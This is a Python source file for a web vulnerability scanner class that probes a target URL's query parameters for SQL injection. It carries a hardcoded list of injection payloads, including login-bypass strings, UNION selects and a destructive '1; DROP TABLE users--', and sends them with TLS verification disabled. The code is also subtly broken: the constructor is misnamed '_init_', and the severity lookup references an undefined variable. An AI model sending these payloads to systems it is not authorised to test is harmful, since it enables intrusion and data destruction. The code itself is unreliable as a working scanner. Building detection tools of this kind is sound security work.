import requests
import logging
from models import Vulnerability
from utils.severity import SeverityCalculator
from utils.recommendations import RecommendationEngine
logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def _init_(self, url, timeout=10):
        self.url = url
        self.timeout = timeout
        self.payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "1' OR '1' = '1",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
            "1; DROP TABLE users--"
        ]
        
        # SQL error patterns
        self.error_patterns = [
            'sql syntax',
            'mysql_fetch',
            'mysql_num_rows',
            'mysqlerror',
            'microsoft sql native client error',
            'odbc sql server driver',
            'oracle error',
            'postgresql error',
            'warning: mysql',
            'warning: pg_',
            'sqlite_error',
            'sqlite3',
            'unclosed quotation mark',
            'quoted string not properly terminated',
            'you have an error in your sql syntax'
        ]
    
    def scan(self):
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        logger.info(f"Starting SQL injection scan on {self.url}")
        
        # Test different injection points
        test_urls = [
            f"{self.url}?id=1",
            f"{self.url}?page=1",
            f"{self.url}?user=test",
            f"{self.url}?search=test"
        ]
        
        for base_url in test_urls:
            for payload in self.payloads:
                try:
                    # Parse URL and inject payload
                    if '?' in base_url:
                        parts = base_url.split('?')
                        params = parts[1].split('=')
                        if len(params) >= 2:
                            test_url = f"{parts[0]}?{params[0]}={payload}"
                        else:
                            continue
                    else:
                        test_url = f"{base_url}?id={payload}"
                    
                    response = requests.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                    
                    # Check for SQL error messages
                    response_text = response.text.lower()
                    
                    for error_pattern in self.error_patterns:
                        if error_pattern in response_text:
                            vuln_type = 'SQL_INJECTION'
                            severity = severity.get_severity(vuln_type)
                            recommendation = RecommendationEngine.get_recommendation(vuln_type)
                            
                            vuln = Vulnerability(
                                vuln_type=vuln_type,
                                severity=severity,
                                description=f"SQL Injection vulnerability detected. The application returned SQL error messages when testing with payload: {payload[:50]}...",
                                recommendation=recommendation['fix'],
                                evidence={
                                    'url': test_url,
                                    'payload': payload,
                                    'error_found': error_pattern,
                                    'response_code': response.status_code
                                }
                            )
                            vulnerabilities.append(vuln)
                            logger.warning(f"SQL Injection found: {test_url}")
                            return vulnerabilities  # Return after first finding
                    
                    # Check for boolean-based blind SQL injection
                    if response.status_code == 200:
                        # Test with always true condition
                        true_payload = "1' OR '1'='1"
                        true_url = test_url.replace(payload, true_payload)
                        
                        try:
                            true_response = requests.get(true_url, timeout=self.timeout, verify=False)
                            
                            # Test with always false condition
                            false_payload = "1' AND '1'='2"
                            false_url = test_url.replace(payload, false_payload)
                            false_response = requests.get(false_url, timeout=self.timeout, verify=False)
                            
                            # If responses are significantly different, possible SQLi
                            if abs(len(true_response.text) - len(false_response.text)) > 100:
                                vuln_type = 'SQL_INJECTION'
                                severity = severity.get_severity(vuln_type)
                                recommendation = RecommendationEngine.get_recommendation(vuln_type)
                                
                                vuln = Vulnerability(
                                    vuln_type=vuln_type,
                                    severity=severity,
                                    description="Possible boolean-based blind SQL injection detected. Different responses for true/false conditions.",
                                    recommendation=recommendation['fix'],
                                    evidence={
                                        'url': base_url,
                                        'method': 'Boolean-based blind',
                                        'true_length': len(true_response.text),
                                        'false_length': len(false_response.text)
                                    }
                                )
                                vulnerabilities.append(vuln)
                                return vulnerabilities
                        except:
                            pass
                    
                except requests.RequestException as e:
                    logger.debug(f"Request failed for {test_url}: {e}")
                    continue
                except Exception as e:
                    logger.error(f"Error during SQL injection scan: {e}")
                    continue
        
        logger.info("SQL injection scan completed")
        return vulnerabilities